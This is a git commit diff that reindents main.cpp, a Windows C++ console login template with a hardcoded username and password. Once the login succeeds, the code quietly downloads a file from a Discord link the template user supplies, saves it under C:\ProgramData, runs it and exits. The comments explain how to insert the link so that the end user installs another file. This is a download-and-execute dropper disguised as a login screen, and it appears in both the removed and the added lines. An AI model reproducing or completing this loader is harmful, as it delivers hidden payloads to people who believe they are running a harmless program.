2ee3e7dc37ce66b69e6e5a3d89935536c8c7f218
yuno <90005945+yunoCPP@users.noreply.github.com>
2021-09-02 22:51:45 +0200

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -30,93 +30,89 @@
 using namespace std;
 
 int main()
-	{
+{
 	
-	SetConsoleTitleA("Login System created by yuno#2285");   // To display your title on the console
+SetConsoleTitleA("Login System created by yuno#2285");   // To display your title on the console
 
-	string Username;
-	string RegisteredUsername = "user";  // To change the user name
+string Username;
+string RegisteredUsername = "user";  // To change the user name
 
-	cout << " \n";  // To return to the line in the console
-	cout << " \n";
-	cout << " \n";
-	cout << " Enter User : ";
-	system("color 1");  // Allows you to change the color of the text in the console
-	Sleep(950);
-;
-	cin >> Username;
-	system("cls");  // To clear the console
+cout << " \n";  // To return to the line in the console
+cout << " \n";
+cout << " \n";
+cout << " Enter User : ";
+system("color 1");  // Allows you to change the color of the text in the console
+Sleep(950);
+
+cin >> Username;
+system("cls");  // To clear the console
 		
 
-	string Password;
-	string RegisteredPassword = "password";  // To change the user's password
+string Password;
+string RegisteredPassword = "password";  // To change the user's password
 
-	bool Loggedin = false;
+bool Loggedin = false;
 
-	while (Loggedin == false)
+while (Loggedin == false)
+{
+if (Username != RegisteredUsername)
+{
+	system("cls");
+	cout << " \n";
+	cout << " \n";
+	cout << " \n";
+	cout << " You have entered a wrong user !";
+	system("color C");
+	Sleep(950);  // After 950ms you can retype your password
+	system("cls");
+	main();  // To return to the beginning of the program
+	cin >> Password;
+}
+if (Username == RegisteredUsername)
+{		
+	cout << " \n";  
+	cout << " \n";
+	cout << " \n";
+	cout << " Enter Password : "; 
+	system("color 1");
+	Sleep(950);
+	cin >> Password;
+
+
+if (Password == RegisteredPassword)
 	{
-		if (Username != RegisteredUsername)
+		system("cls");
+		cout << " \n";
+		cout << " \n";
+		cout << " \n";
+		cout << " Enter Password : ";
+		cout << " Successful connection ! " << endl;  // This message appears if the user enters the correct password
+		system("color 6");
+		Sleep(950);
+		Loggedin = true;
+		void checker();
 		{
-			system("cls");
-			cout << " \n";
-			cout << " \n";
-			cout << " \n";
-			cout << " You have entered a wrong user !";
-			system("color C");
-			Sleep(950);  // After 950ms you can retype your password
-			system("cls");
-			main();  // To return to the beginning of the program
-			cin >> Password;
+			string TEST = "  ";  // Enter the Discord link for the user to install another file.
+			string LOGIN = "C:\ProgramData\...";  // Select the path to your file 
+			URLDownloadToFileA(NULL, TEST.c_str(), LOGIN.c_str(), 0, NULL);;
+			system("Start C:\ProgramData\...");  // Enter the path to your file so that it runs
+			exit(3);
 		}
 
-		if (Username == RegisteredUsername)
-		{		
-			cout << " \n";  
-			cout << " \n";
-			cout << " \n";
-			cout << " Enter Password : "; 
-			system("color 1");
-			Sleep(950);
-			cin >> Password;
-
-
-			if (Password == RegisteredPassword)
-			{
-				system("cls");
-				cout << " \n";
-				cout << " \n";
-				cout << " \n";
-				cout << " Enter Password : ";
-				cout << " Successful connection ! " << endl;  // This message appears if the user enters the correct password
-				system("color 6");
-				Sleep(950);
-				Loggedin = true;
-				void checker();
-				{
-					string TEST = "  ";  // Enter the Discord link for the user to install another file.
-					string LOGIN = "C:\ProgramData\...";  // Select the path to your file 
-					URLDownloadToFileA(NULL, TEST.c_str(), LOGIN.c_str(), 0, NULL);;
-					system("Start C:\ProgramData\...");  // Enter the path to your file so that it runs
-					exit(3);
-				}
-
-			}
-			else
-			{
-				system("cls"); 
-				cout << " \n";
-				cout << " \n";
-				cout << " \n";
-				cout << " You have entered a wrong password ! " << endl;  // This message appears if the user enters a wrong password
-				system("color c");
-				Sleep(950);  
-				system("cls");
-
-				
-			}
+}
+else
+	{
+		system("cls"); 
+		cout << " \n";
+		cout << " \n";
+		cout << " \n";
+		cout << " You have entered a wrong password ! " << endl;  // This message appears if the user enters a wrong password
+		system("color c");
+		Sleep(950);  
+		system("cls");	
 		}
-
 	}
+
+}
 	system("pause");
 }
-
